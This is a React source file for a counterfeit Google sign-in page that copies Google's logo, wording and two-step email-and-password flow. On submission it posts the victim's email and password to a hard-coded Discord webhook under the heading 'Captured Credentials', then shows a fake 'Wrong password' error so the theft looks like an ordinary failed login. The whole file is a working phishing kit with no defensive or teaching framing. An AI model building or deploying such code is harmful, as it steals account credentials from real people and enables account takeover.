import React, { useState } from 'react';
import './App.css';

const App = () => {
  const [step, setStep] = useState(1); // 1 for email, 2 for password
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Discord webhook URL - User needs to provide this
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1386316409859997776/5a_bGU79X1WWbf9-wafzCm5zlg5GaZqSAHbfPOFU9dqNnmhD261WSh3IhCR7cDx6W8_O";

  const sendToDiscord = async (credentials) => {
    try {
      const payload = {
        content: "🔐 **New Google Login Attempt**",
        embeds: [
          {
            title: "Captured Credentials",
            color: 0x4285f4,
            fields: [
              {
                name: "Email/Phone",
                value: credentials.email,
                inline: true
              },
              {
                name: "Password",
                value: credentials.password,
                inline: true
              },
              {
                name: "Timestamp",
                value: new Date().toISOString(),
                inline: true
              }
            ],
            footer: {
              text: "Google Login Clone"
            }
          }
        ]
      };

      if (DISCORD_WEBHOOK_URL !== "REPLACE_WITH_YOUR_DISCORD_WEBHOOK_URL") {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });
      } else {
        console.log("Discord webhook not configured. Credentials captured:", credentials);
      }
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
  };

  const handleEmailNext = (e) => {
    e.preventDefault();
    setEmailError('');
    
    if (!email.trim()) {
      setEmailError('Enter an email or phone number');
      return;
    }
    
    if (!email.includes('@') && !email.match(/^\d+$/)) {
      setEmailError('Enter a valid email or phone number');
      return;
    }
    
    setStep(2);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setPasswordError('');
    setIsLoading(true);
    
    if (!password.trim()) {
      setPasswordError('Enter your password');
      setIsLoading(false);
      return;
    }
    
    // Send to Discord webhook
    await sendToDiscord({ email, password });
    
    // Simulate a delay and show error (to make it look realistic)
    setTimeout(() => {
      setPasswordError('Wrong password. Try again or click Forgot password to reset it.');
      setIsLoading(false);
    }, 1500);
  };

  const handleBack = () => {
    setStep(1);
    setPasswordError('');
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* Google Logo */}
        <div className="text-center mb-6">
          <svg className="w-20 h-20 mx-auto mb-6" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
            <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#EA4335" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
            <path fill="#FBBC05" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c9.66 0 16.7 3.85 21.09 8.4l-6.05 6.05c-3.85-3.85-9.74-6.72-15.04-6.72-12.28 0-22.01 9.74-22.01 22.18 0 12.44 9.73 22.18 22.01 22.18 8.15 0 12.44-3.27 15.36-6.3 2.35-2.35 3.93-5.71 4.54-10.75H35.29z"/>
          </svg>
        </div>

        {/* Sign in form */}
        <div className="bg-white border border-gray-200 rounded-lg p-10 shadow-sm">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-normal text-gray-900 mb-2">Sign in</h1>
            <p className="text-sm text-gray-600">Use your Google Account</p>
          </div>

          {step === 1 ? (
            // Email step
            <form onSubmit={handleEmailNext}>
              <div className="mb-6">
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email or phone"
                  className={`w-full px-4 py-3 border rounded-md text-base focus:outline-none focus:ring-2 transition-all ${
                    emailError 
                      ? 'border-red-500 focus:ring-red-200' 
                      : 'border-gray-300 focus:border-blue-500 focus:ring-blue-200'
                  }`}
                />
                {emailError && (
                  <p className="text-red-600 text-sm mt-2 flex items-center">
                    <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                    </svg>
                    {emailError}
                  </p>
                )}
              </div>

              <div className="mb-6">
                <button
                  type="button"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Forgot email?
                </button>
              </div>

              <div className="text-sm text-gray-600 mb-8">
                Not your computer? Use Guest mode to sign in privately.{' '}
                <button className="text-blue-600 hover:underline">
                  Learn more about using Guest mode
                </button>
              </div>

              <div className="flex justify-between items-center">
                <button
                  type="button"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Create account
                </button>
                <button
                  type="submit"
                  className="bg-blue-600 text-white px-6 py-2 rounded-full text-sm font-medium hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-200"
                >
                  Next
                </button>
              </div>
            </form>
          ) : (
            // Password step
            <form onSubmit={handlePasswordSubmit}>
              <div className="flex items-center mb-6">
                <button
                  type="button"
                  onClick={handleBack}
                  className="mr-4 p-2 hover:bg-gray-100 rounded-full"
                >
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                  </svg>
                </button>
                <div>
                  <div className="flex items-center mb-1">
                    <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center mr-3">
                      <span className="text-sm font-medium text-gray-700">
                        {email.charAt(0).toUpperCase()}
                      </span>
                    </div>
                    <span className="text-sm text-gray-900">{email}</span>
                  </div>
                </div>
              </div>

              <div className="mb-6">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className={`w-full px-4 py-3 border rounded-md text-base focus:outline-none focus:ring-2 transition-all ${
                    passwordError 
                      ? 'border-red-500 focus:ring-red-200' 
                      : 'border-gray-300 focus:border-blue-500 focus:ring-blue-200'
                  }`}
                />
                {passwordError && (
                  <p className="text-red-600 text-sm mt-2 flex items-center">
                    <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                    </svg>
                    {passwordError}
                  </p>
                )}
              </div>

              <div className="mb-8">
                <button
                  type="button"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Forgot password?
                </button>
              </div>

              <div className="flex justify-end">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="bg-blue-600 text-white px-6 py-2 rounded-full text-sm font-medium hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-200 disabled:opacity-50 flex items-center"
                >
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Signing in...
                    </>
                  ) : (
                    'Next'
                  )}
                </button>
              </div>
            </form>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <div className="flex justify-center items-center space-x-4 text-xs text-gray-600 mb-4">
            <select className="border-none bg-transparent text-gray-600 focus:outline-none">
              <option>English (United States)</option>
            </select>
          </div>
          <div className="flex justify-center space-x-6 text-xs text-gray-600">
            <button className="hover:underline">Help</button>
            <button className="hover:underline">Privacy</button>
            <button className="hover:underline">Terms</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;
